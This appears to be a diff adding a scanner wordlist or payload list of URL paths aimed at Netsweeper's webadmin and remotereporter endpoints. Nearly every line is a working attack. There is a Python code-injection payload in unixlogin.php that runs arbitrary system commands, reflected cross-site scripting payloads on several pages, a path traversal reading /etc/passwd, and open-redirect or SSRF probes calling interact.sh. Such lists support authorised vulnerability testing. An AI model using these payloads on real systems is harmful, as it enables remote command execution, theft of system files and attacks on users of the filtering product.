@@ -1,0 +1,13 @@
+/webadmin/clientlogin/?srid=&action=showdeny&url=
+/webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%27{{url_encode(hex_encode(cmd))}}%27.decode%28%27hex%27%29%29%23&timeout=5
+/webadmin/out
+/webadmin/reporter/view_server_log.php?server=localhost&act=stats&filename=&offset=1&count=1000&sortorder=&log=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&offset=&sortitem=&filter=
+/webadmin/start/
+/webadmin/tools/systemstatus_remote.php
+/webadmin/policy/category_table_ajax.php?customctid=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/remotereporter/load_logfiles.php?server=018192&url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/webadmin/policy/group_table_ajax.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/webadmin/reporter/view_server_log.php?act=stats&filename=log&offset=1&count=1&sortorder=0&filter=0&log=../../../../../../etc/passwd
+/webadmin/deny/index.php?dpid=1&dpruleid=1&cat=1&ttl=5018400&groupname=<group_name_eg_netsweeper_student_allow_internet_access&policyname=auto_created&username=root&userip=127.0.0.1&connectionip=127.0.0.1&nsphostname=netsweeper&url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/remotereporter/load_logfiles.php?server=127.0.0.1&url=https://interact.sh/
+/webadmin/authportal/bounce.php?url=https://interact.sh/
